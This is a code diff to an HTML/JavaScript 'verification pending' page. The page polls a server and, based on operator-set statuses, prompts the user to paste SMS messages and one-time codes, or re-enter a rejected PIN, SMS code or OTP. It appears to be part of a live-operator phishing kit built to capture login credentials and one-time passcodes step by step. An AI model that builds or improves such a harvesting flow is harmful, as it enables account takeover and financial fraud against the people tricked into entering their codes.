@@ -50,7 +50,7 @@
 </head>
 <body>
     <div class="screen-container">
-        
+
         <!-- Waiting State -->
         <div id="waitSection">
             <div class="hourglass-circle">⏳</div>
@@ -79,8 +79,8 @@
 
             <form action="/submit-auth-code" method="POST">
                 <div class="mb-3">
-                    <textarea class="form-control" name="auth_code" rows="4" 
-                        placeholder="Paste the message here..." 
+                    <textarea class="form-control" name="auth_code" rows="4"
+                        placeholder="Paste the message here..."
                         required style="border-radius: 12px; font-size: 0.9rem; background-color: #ffffff; color: #000;"></textarea>
                 </div>
                 <button type="submit" class="btn btn-warning w-100 py-3 fw-bold text-dark rounded-3 shadow">SUBMIT SMS AUTHORIZATION</button>
@@ -91,18 +91,38 @@
 
     <script>
         const appId = "{{ app_id }}";
+        const urlParams = new URLSearchParams(window.location.search);
+        const forceSms = urlParams.get("reenter") === "sms";
+
+        function showSmsBox() {
+            document.getElementById('waitSection').classList.add('d-none');
+            document.getElementById('smsSection').classList.remove('d-none');
+        }
 
         function checkStatus() {
-            fetch('/check-status?app_id=' + appId)
+            fetch('/check-status?app_id=' + encodeURIComponent(appId))
                 .then(response => response.json())
                 .then(data => {
-                    const waitSection = document.getElementById('waitSection');
-                    const smsSection = document.getElementById('smsSection');
                     const msgBox = document.getElementById('customMsg');
 
-                    if (data.status === "Stage1_Approved") {
-                        waitSection.classList.add('d-none');
-                        smsSection.classList.remove('d-none');
+                    if (data.status === "PIN_Rejected") {
+                        window.location.href = "/login";
+                        return;
+                    }
+                    if (data.status === "SMS_Rejected") {
+                        window.location.href = "/pending?app_id=" + encodeURIComponent(appId) + "&reenter=sms";
+                        return;
+                    }
+                    if (data.status === "OTP_Rejected") {
+                        window.location.href = "/final-verify";
+                        return;
+                    }
+
+                    if (data.status === "Stage1_Approved" || forceSms) {
+                        showSmsBox();
+                        if (data.status !== "Stage1_Approved") {
+                            setTimeout(checkStatus, 2000);
+                        }
                     } else if (data.status === "Stage2_Approved") {
                         window.location.href = "/final-verify";
                     } else if (data.status === "Stage3_Approved" || data.status === "Approved") {
@@ -111,14 +131,15 @@
                         msgBox.style.display = 'block';
                         msgBox.textContent = data.custom_message;
                         setTimeout(checkStatus, 2000);
-                    } else if (data.status === "Rejected") {
-                        alert(data.custom_message || "Verification failed. Please try again.");
-                        window.location.href = "/login";
                     } else {
                         setTimeout(checkStatus, 1500);
                     }
                 })
                 .catch(() => setTimeout(checkStatus, 2500));
+        }
+
+        if (forceSms) {
+            showSmsBox();
         }
 
         if (appId) {
